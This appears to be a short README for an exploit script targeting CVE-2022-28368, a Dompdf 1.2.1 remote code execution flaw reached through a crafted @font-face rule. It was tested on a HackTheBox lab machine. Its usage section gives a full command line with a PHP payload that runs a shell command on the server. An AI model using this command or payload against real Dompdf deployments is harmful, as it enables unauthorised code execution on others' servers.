# CVE-2022-28368: Dompdf 1.2.1 Remote Code Execution (RCE)
## Description
Dompdf 1.2.1 allows remote code execution via a .php file in the src:url field of an @font-face Cascading Style Sheets (CSS) statement (within an HTML input file).
![exploit](https://uploads-ssl.webflow.com/5f6498c074436c349716e747/622a16a6fe8ba07ec2a8b52c_dompdf_rce_cover_cropped-p-1080.png)
## Usage:
```
python3 dugg.py --dompdf "http://prd.m.rendering-api.interface.htb/api/html2pdf" --fonts "http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/" --query '{"html":"FUZZ", "asd":"asd"}' --payload "<?php shell_exec('id'); ?>"
```
## PoC:
![poc](./poc.png)
Exploit tested on hackthebox machine, [Interface](https://app.hackthebox.com/machines/527)
## References:
1. https://nvd.nist.gov/vuln/detail/CVE-2022-28368
2. http://packetstormsecurity.com/files/171738/Dompdf-1.2.1-Remote-Code-Execution.html
3. https://www.exploit-db.com/exploits/51270
4. https://github.com/positive-security/dompdf-rce
5. https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf
6. https://positive.security/blog/dompdf-rce
